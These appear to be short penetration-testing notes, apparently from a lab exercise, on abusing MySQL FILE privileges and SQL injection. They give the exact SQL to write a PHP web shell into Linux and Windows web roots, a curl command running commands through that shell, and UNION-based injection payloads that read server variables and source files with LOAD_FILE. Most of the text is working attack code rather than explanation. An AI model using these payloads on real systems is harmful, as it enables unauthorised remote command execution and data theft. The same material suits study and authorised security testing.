If you have read access to the `mysql` system database, you can query the user table directly:

```ruby
SELECT user, file_priv FROM mysql.user WHERE user = CURRENT_USER();
```

(If `file_priv` returns 'Y', you are good to go).


Even if you have the `FILE` privilege, MySQL might still block you if the `secure_file_priv` variable restricts where files can be written. Check its status with this command:

```ruby
SHOW VARIABLES LIKE 'secure_file_priv';
```

- **Empty (`Value` is blank):** You can write anywhere on the filesystem (Ideal scenario).
    
- **A specific path (e.g., `/var/lib/mysql-files/`):** You can only write files inside that specific directory.
    
- **NULL:** File reading/writing is completely disabled, and `INTO OUTFILE` will not work.

If you have the `FILE` privilege, `secure_file_priv` is empty, and you know the absolute path to a writable web directory (like `/var/www/html/`), here is the exact SQL command to drop the PHP web shell:

```ruby
SELECT '<?php echo shell_exec($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/webshell.php';
```

Once the query executes successfully, you can browse to `http://<target-ip>/webshell.php?c=id` to execute your commands.


for windows:

```ruby
SELECT '<?php echo shell_exec($_GET["c"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/webshell.php';
```

curl "http://10.129.69.207/webshell.php?c=whoami"



## Reading Files

Checking the privilege

```
cn'UNION select 1,variable_name,variable_value,4 from information_schema.global_variables where variable_name="secure_file_priv"-- -
```


```
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

